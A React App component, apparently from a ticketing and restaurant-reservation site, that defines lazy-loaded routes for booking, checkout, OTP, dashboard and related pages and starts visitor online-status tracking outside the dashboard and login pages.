import { Switch, Route } from "wouter";
import { queryClient } from "./lib/queryClient";
import { QueryClientProvider } from "@tanstack/react-query";
import { Toaster } from "@/components/ui/toaster";
import { TooltipProvider } from "@/components/ui/tooltip";
import { Loading } from "@/components/loading";
import { Suspense, lazy, useEffect } from "react";
import { setupOnlineStatus } from "@/lib/utils";

const Home = lazy(() => import("@/pages/home"));
const TicketsPage = lazy(() => import("@/pages/tickets"));
const RegistrationPage = lazy(() => import("@/pages/registration"));
const BookingPage = lazy(() => import("@/pages/booking"));
const CartPage = lazy(() => import("@/pages/cart"));
const CheckoutPage = lazy(() => import("@/pages/checkout"));
const OTPPage = lazy(() => import("@/pages/otp"));
const ConfirmationPage = lazy(() => import("@/pages/confirmation"));
const DashboardPage = lazy(() => import("@/pages/dashboard"));
const LoginPage = lazy(() => import("@/pages/login"));
const RestaurantsPage = lazy(() => import("@/pages/restaurants"));
const RestaurantDetailPage = lazy(() => import("@/pages/restaurant-detail"));
const ReservePage = lazy(() => import("@/pages/reserve"));
const NotFound = lazy(() => import("@/pages/not-found"));

function Router() {
  return (
    <Suspense fallback={<Loading />}>
      <Switch>
        <Route path="/" component={Home} />
        <Route path="/tickets" component={TicketsPage} />
        <Route path="/registration" component={RegistrationPage} />
        <Route path="/booking" component={BookingPage} />
        <Route path="/cart" component={CartPage} />
        <Route path="/checkout" component={CheckoutPage} />
        <Route path="/otp" component={OTPPage} />
        <Route path="/confirmation" component={ConfirmationPage} />
        <Route path="/dashboard" component={DashboardPage} />
        <Route path="/login" component={LoginPage} />
        <Route path="/restaurants" component={RestaurantsPage} />
        <Route path="/restaurant/:id" component={RestaurantDetailPage} />
        <Route path="/reserve/:id" component={ReservePage} />
        <Route component={NotFound} />
      </Switch>
    </Suspense>
  );
}

function App() {
  useEffect(() => {
    const path = window.location.pathname;
    if (path.startsWith("/dashboard") || path.startsWith("/login")) {
      return;
    }
    const visitorId = localStorage.getItem("visitor");
    if (visitorId) {
      setupOnlineStatus(visitorId);
    }
  }, []);

  return (
    <QueryClientProvider client={queryClient}>
      <TooltipProvider>
        <Toaster />
        <Router />
      </TooltipProvider>
    </QueryClientProvider>
  );
}

export default App;
